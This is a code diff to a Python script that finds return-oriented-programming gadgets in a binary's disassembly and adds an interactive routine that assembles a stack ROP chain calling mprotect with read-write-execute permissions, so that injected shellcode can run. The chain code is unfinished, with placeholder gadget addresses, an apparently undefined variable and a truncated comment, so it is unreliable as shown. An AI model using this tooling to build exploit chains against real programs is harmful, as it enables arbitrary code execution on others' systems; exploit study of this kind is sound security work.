@@ -23,34 +23,24 @@ with open(filename, 'rb') as file:
 
 gadgets = []
 gadgetIndex = 0
-
-
+getOneRet = True
 while gadgetIndex < len(disas):
+        if ((disas[gadgetIndex][1] == 'ret') and getOneRet):
+                gadgets.append((disas[gadgetIndex],))
+                getOneRet = False
         if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'ret'):
                 gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1]))
         if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'ret')):
                 gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2]))
+        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'ret')):
+                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3]))
+        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'ret')):
+                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4]))
+        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'pop') and (disas[gadgetIndex+5][1] == 'ret')):
+                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4],disas[gadgetIndex+5]))
+
 
         gadgetIndex = gadgetIndex + 1
-
-'''
-for reg_tup in register_tuple:
-    for x in range(0, len(gadgets)):
-        if (gadgets[x][2] == reg_tup[1]) and (gadgets[x][1] < reg_tup[2]):
-            reg_tup[2] = gadgets[x][1]
-'''
-
-
-'''
-while gadgetIndex < len(disas):
-    for distance_to_ret in range(1,6):
-        for reg in [("rdi", "rsi", "rdx"]:
-            if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+distance_to_ret][1] == 'ret'):
-                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1]))
-
-
-    gadgetIndex = gadgetIndex + 1
-'''
 
 #remove duplicates
 gadgets.sort()
@@ -72,6 +62,7 @@ while gadgetIndex < len(gadgets):
         if(not broke):
                 del gadgets[gadgetIndex]
 
+print("Available Gadgets: ")
 for i in gadgets:
         print(i)
 
@@ -92,4 +83,28 @@ for x in range(0, len(gadgets)):
 print(shortest_rdi)
 print(shortest_rsi)
 print(shortest_rdx)
+heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
+if heapOrStack == "S":
+        baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
+        addressOfMprotect = input("Input address of mprotect (PLT or libc is fine): ")
+        gadget1addr = "0x0"
+        gadget2addr = "0x0"
+        gadget3addr = "0x0"
+
+        gadget1 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget1addr, 16)))
+        gadget1.reverse()
+        gadget2 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget2addr, 16)))
+        gadget2.reverse()
+        gadget3 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget3addr, 16)))
+        gadget3.reverse()
+
+        arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc st$
+        arg_addr.reverse()
+
+        arg_len = b"\x00\x10\x00"  # len of the shellcode as size_t
+
+        arg_prot = b"\x07"  # int, look at man pages (c-level flags)
+
+        faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
+        faddr_byte_array.reverse()
 
